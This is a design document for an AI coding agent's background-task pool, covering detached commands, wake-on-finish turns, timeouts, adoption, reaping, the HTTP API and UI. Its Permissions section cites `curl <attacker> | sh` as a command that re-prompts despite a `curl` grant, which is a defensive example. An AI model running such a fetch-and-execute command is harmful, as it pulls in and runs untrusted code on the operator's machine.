# Background tasks

`run_command` normally blocks the whole turn until the command exits, which makes the agent sit idle through builds, test suites, installs and batch downloads. A backgrounded call hands the command to a **session-scoped task pool** and returns a task id immediately, so the agent keeps working and collects the result later.

## Model-facing surface

| Tool | Purpose |
|---|---|
| `run_command` with `background: true` | Start the command detached; returns a `task_id` instead of output. |
| `background_list` | Every task of the session with status, elapsed time, and estimate. |
| `background_output` | Captured stdout and stderr, including while the task still runs (`tail_lines`, default 100). |
| `background_wait` | Block for a bounded stretch (default 60s, maximum 300s) and return the output once the task ends. |
| `background_stop` | Terminate a task and the whole process group it started, including one left behind by an earlier foxxycode run. |
| `background_reap` | Kill every background process of this session that outlived the foxxycode run which started it. |

Two extra `run_command` arguments drive the pool:

- **`background`** (bool) — run detached.
- **`expected_seconds`** (int) — the model's own estimate of how long the work takes. It is **advisory**: it drives the status ticker the operator sees and, when `timeout_seconds` is omitted, the hard timeout. Guessing low only marks the task **overdue**; it never kills the task early.
- **`notify_on_finish`** (bool) — wake the agent when this task ends (see below).

The shared agent prompt fragment (`internal/prompts/sections/agent/background_cmds.md`) tells the model when to background, to estimate honestly, to poll rather than busy-wait on `background_wait`, to stop servers and watchers it started, and to read the final status before summarising the outcome. Background execution is available in **both** agent and plan mode: a planner investigating a repo should not have to sit through a slow read-only command either.

## Waking the agent when a task finishes

A long job is only useful unattended if something restarts the conversation when it ends. A task started with `notify_on_finish: true` therefore begins a **new agent turn on its own** once it reaches a terminal state, so the model can end its turn the moment the work is handed off.

The opt-in is the point. The model decides which results are worth a turn, so a batch of quick commands cannot each spend one behind the operator's back; everything else simply lands in the history for the model to read later.

- The woken turn starts from a plain statement of the outcome — id, status, exit code, runtime, and any error — and is told to read the output with `background_output` rather than having a wall of text pasted into the prompt. It is also told explicitly that a task which failed, timed out, or was stopped did not succeed.
- **Tasks finishing together cost one turn.** A short settle window batches a burst, so three results arrive as one turn with three lines instead of three turns.
- The turn goes through the session manager's normal prompt path, so it takes the **composer turn lock**: a wake waits for a turn already in flight instead of racing it.
- **Shutdown does not wake anything.** Drain stops running tasks, and a stop is terminal; without that guard every task killed by shutdown would start a turn nobody will read.
- A woken turn can start another notifying task, which is a legitimate pattern for unattended work and also a way to burn a night of tokens on a loop. `maxWakesPerSession` (50 per process, `internal/agent/background_notify.go`) is the backstop; reaching it stops starting turns and logs `background_wake_capped`.

Wiring lives in `Server.attachBackgroundWaker` (`external/httpserver/background_http.go`), which subscribes under a **keyed** pool subscription so rebuilding the server replaces the watcher instead of stacking another.

## Timeouts

A task always has a hard limit, resolved in this order:

1. an explicit `timeout_seconds` wins, including a deliberately tight one;
2. otherwise a stated `expected_seconds` buys **3×** itself, floored at **60s** so a wildly optimistic guess does not kill work that was only a little slow;
3. otherwise `tools.background.default_timeout_seconds` (900s).

The result is capped by `tools.background.max_timeout_seconds` (3600s). Hitting the limit terminates the process group and records the task as `timed_out` — that is a failure, not a success, and the model is told to report it as one.

An **adopted** task (see below) is the one case with no caller-supplied limit: it gets `max_timeout_seconds` outright. It has no estimate behind it, and the one number that must never be reused is the foreground timeout it just outlived — an explicit `timeout_seconds` wins verbatim, so passing the expired value would kill the task in milliseconds.

## Adoption: a foreground command that outlives its timeout

A foreground `run_command` waits 30 seconds by default. Killing whatever is still running at that point is wrong twice over: a dev server or watcher is doing exactly what was asked, and anything the shell spawned survives a kill aimed only at the shell while still holding the inherited output pipe — which used to wedge `cmd.Wait` forever and hang the whole turn.

So the command is **handed to the pool instead of killed**. The process keeps running in the same process group, its output stream is redirected into the task's sink with everything captured so far flushed in first, and the tool answers with:

```
Command still running after 30s. It was NOT cancelled: it now runs as background task bg_3 (hard timeout 1h).
Follow it with background_output task_id="bg_3", background_wait, or terminate it with background_stop.
Do NOT run this command again with a larger timeout_seconds: it is already running, and a second copy would fight the first one for the same ports, locks and files.
Output captured so far:

  App running at:
  - Local:   http://localhost:8081/
```

The notice leads and the output follows, because the tool output ceiling truncates from the end. The result is a normal tool result, not an error: the agent loop shows the model an error's text and discards the result string, so reporting a timeout as an error is what threw the captured output away.

From there the task is an ordinary one — `background_list`, `background_output`, `background_wait`, `background_stop` all reach it, `notify_on_finish` is off (the model is being told right now), and its elapsed time counts from the original foreground start rather than from the handover.

The command **is** terminated, process group and all, in the three cases where nothing can take ownership: the turn was cancelled, no pool is wired, or the pool refused (`tools.background.enabled: false`, session at `max_concurrent`, process draining). The answer then names the exact reason and points at `background: true`.

Implementation: `Pool.Adopt` (`internal/bgtask/pool.go`) shares the single scheduling path with `Pool.Start`; the shell side is `startForeground` and `adoptedHandle` in `internal/tools/shell/foreground.go`, with `switchWriter` holding the output until the pool takes it over. Exactly one `cmd.Wait` exists per command — the pool observes the same result rather than calling it again.

Known limitation: an adopted command keeps writing through the pipe `exec` created for the foreground run, and that pipe is drained only until `cmd.Wait` returns. If the command detaches a daemon and its shell then exits, `WaitDelay` closes the pipe five seconds later and the task is recorded as finished with the shell's exit code — the daemon keeps running, but whatever it prints after that point is lost. The trade is deliberate: without `WaitDelay` the wait would hang on the inherited pipe exactly the way the original bug did. Commands that keep their server in the shell's foreground — which dev servers do by default — are unaffected.

## Output is sanitised on read

Captured bytes are stored raw in `output.log`; escape sequences and carriage-return progress redraws are stripped when the output is **read** (`platform.SanitizeOutput`, applied in `bgtask.decodeOutput` and by `run_command` itself). A webpack or vue-cli build otherwise spends most of its output on `\x1b[2K\x1b[1A` redraws, and the line that matters is buried in them. Stripping at read time keeps the on-disk log a faithful record and avoids corrupting escape sequences that straddle two writes.

## Lifecycle and persistence

The pool lives **inside the running `foxxycode` process**. Each task mirrors its metadata and captured output into the session bundle:

```
<sessionDir>/background/<task_id>/meta.json
<sessionDir>/background/<task_id>/output.log
```

The in-memory output window is bounded (`tools.background.output_buffer_bytes`, 256 KiB) so a chatty task cannot grow without limit; the log on disk keeps everything. Reading a persisted log back is capped at its last 256 KiB, so a watcher left running for a day cannot be pulled into memory wholesale — the response flags the truncation.

- **Server drain** and **session delete** terminate every running task of the affected scope, so shutting foxxycode down does not leave orphaned shell trees behind.
- **After a restart**, a task recorded as still in flight is reported as **`orphaned`** rather than as running forever. The correction is derived on every read and deliberately **not** written back: the HTTP list is polled, and rewriting would clobber the metadata of tasks still running in this process and race the supervisor's own write of the same file. The id counter resumes past whatever the bundle already holds, so a new task never overwrites the log of an identically named one from the previous process.

Statuses: `queued`, `running`, `succeeded`, `failed`, `timed_out`, `stopped`, `orphaned`.

## Stuck and leftover processes

Two different problems, with two different answers.

**Stuck**: a task that is running but doing nothing. There is no way to know that from the outside, so the pool reports the only fact it has — how long the task has produced no output. `background_list` marks a running task `silent for …` after a minute of quiet. It is a hint, not a verdict: `sleep`, a dev server and a watcher are all supposed to be silent. The model reads the command, decides, and calls `background_stop`. The hard timeout is still the backstop for anything nobody looks at.

**Leftover**: a process that outlived the foxxycode run which started it, because that run was killed rather than drained. The task record persists the **process group leader pid**, so a fresh foxxycode can tell a record whose processes are gone (reported `orphaned`) from one whose processes are still on this machine. `background_list` marks those `still alive from an earlier run`, `background_stop` reaches one by id, and `background_reap` kills all of them for the session at once.

Only a record that still claimed to be **running** when its process died is ever a reaping candidate. A task that finished normally leaves a stale pid, and the OS reuses pids — acting on one would kill an unrelated process.

There is deliberately **no** tool that kills an arbitrary pid. `run_command` can already run `kill`, and it goes through the permission gate; a dedicated tool would route around that.

## Permissions

A backgrounded command goes through the same permission gate as a foreground one — backgrounding is not a way around approval. Because a batch of calls that differ only in their arguments would otherwise ask once per call, the dialog offers a fourth choice next to **Allow** / **Allow always** / **Reject**:

**Always allow `<program>`** widens the grant from the exact command to the program itself. The button names the exact allowlist entry that will be stored, so the operator approves the string that is actually saved:

- `curl -s https://example.com/a` → grants **`curl`**, which then covers `curl` with any arguments;
- `git status --short` → grants **`git status`**, because for multiplexers (`git`, `go`, `npm`, `docker`, `make`, `kubectl`, …) the first argument selects what actually happens; `git push` still asks.

Widening is offered **only** for a single plain invocation. Anything carrying shell metacharacters (`| & ; < > $( ) backtick * ? [ ] { } ! # ~ % @`, a newline) or a leading `VAR=` assignment keeps the narrow grant. `Allow always` keeps its original meaning; the wider grant is never implied.

Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.

## HTTP surface

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/foxxycode/sessions/{id}/background-tasks` | Task rows plus a `running` count. |
| `GET` | `/foxxycode/sessions/{id}/background-tasks/{task_id}` | One task with its captured `output` (optional `?tail=N`). |
| `POST` | `/foxxycode/sessions/{id}/background-tasks/{task_id}/stop` | Terminate the task; returns the final row and output. |

Rows carry the raw snapshot plus server-computed `elapsed_seconds`, `overdue`, and `running`, so every client agrees on the clock arithmetic. Tasks recorded by an earlier process are merged in from the session bundle as `orphaned`.

The SPA **polls** these endpoints rather than listening on SSE: a background task outlives the stream of the turn that started it. Cadence is 2.5s while anything runs and 15s otherwise.

## UI

The panel is **docked inside the session**, to the right of the transcript, at `#/s/<sessionId>/tasks` (and `#/s/<sessionId>/tasks/<task_id>` for one task). The route carries the chat, so a reload restores both the conversation and the panel. That placement is the answer to "which session spawned this process": the panel is part of the conversation that started the tasks, so there is nothing to label.

- **Running** is a section of cards: status dot, command, elapsed against the estimate, a progress bar drawn **only** when the model supplied one, and a Stop control.
- **Finished N** is a counter, not a list. Expanding it shows one scannable line per task (dot, command, outcome, clock); the rest stay on disk. That is how "keep every log" and "do not load the app" hold at once: the list is counted, the rows render on demand, and a task's output is fetched only when it is opened.
- **Clear** drops the finished history for this session (`DELETE /foxxycode/sessions/{id}/background-tasks`). Running tasks are untouched.
- Ordering is **purely by start time**, newest first, in both sections. Running tasks are not floated to the top: they already have their own section, and mixing two orderings makes a list that never sits still to read.
- The **opener** is a chip at the end of the transcript, under the last message: `N running tasks` while work is in flight, `N background tasks` once everything has finished, and nothing in a chat that never ran one. It is deliberately not in the nav rail — background tasks belong to one chat.
- A transcript tool row that started a task keeps a live chip in its collapsed summary, plus **Open in Tasks** and **Stop** when expanded.

Layout, colour, and mobile contracts are in `DESIGN.md` (**Background tasks panel**, **Background task ticker card**).

## Configuration

See `tools.background` in `docs/config-reference.md`:

```yaml
tools:
  background:
    enabled: true
    max_concurrent: 5
    default_timeout_seconds: 900
    max_timeout_seconds: 3600
    output_buffer_bytes: 262144
```

Setting `enabled: false` removes the `background` option from `run_command` and does not register the background tools at all.

## Extension point: nested agents

The pool deliberately knows nothing about shells. What a task *is* comes from a `Runner`:

```go
type Runner interface {
	Start(spec Spec, out io.Writer) (Handle, error)
}

type Handle interface {
	Wait() (exitCode int, err error)
	Stop(grace time.Duration) error
}
```

`CommandRunner` is the only implementation today, and `Spec.Kind` already carries a reserved `KindAgent` value that flows end to end through the snapshot, the persistence format, the HTTP surface, and the drawer. Spawning a nested agent as a background task is therefore a second `Runner` plus a tool that builds the `Spec` — not a second scheduling mechanism, a second status surface, or a second drawer. That work is intentionally **out of scope** for this change and belongs in its own PR.

## Tests

- Happy paths are Gherkin specs run by godog: `features/background_tasks.feature` (pool behaviour through the tools, `internal/tools/shell/bdd_background_test.go`), `features/background_tasks_http.feature` (REST surface, `external/httpserver/bdd_background_test.go`), `features/background_permissions.feature` (the program-wide grant, `internal/permission/bdd_background_permissions_test.go`), and `features/foreground_timeout_adoption.feature` (handover of a foreground command that outlives its timeout, `internal/tools/shell/bdd_foreground_timeout_test.go`).
- Edge cases live in ordinary unit tests: timeout resolution, the concurrency cap, output-window truncation, orphan marking, id uniqueness across restarts (`internal/bgtask`), grant refusal for metacharacters (`internal/permission`), and the UI helpers (`external/ui/src/ui/tasks/`).
- End-to-end against a real model: `examples/httpserver/http_e2e_background.py` and `examples/acp/acp_e2e_background.py`.
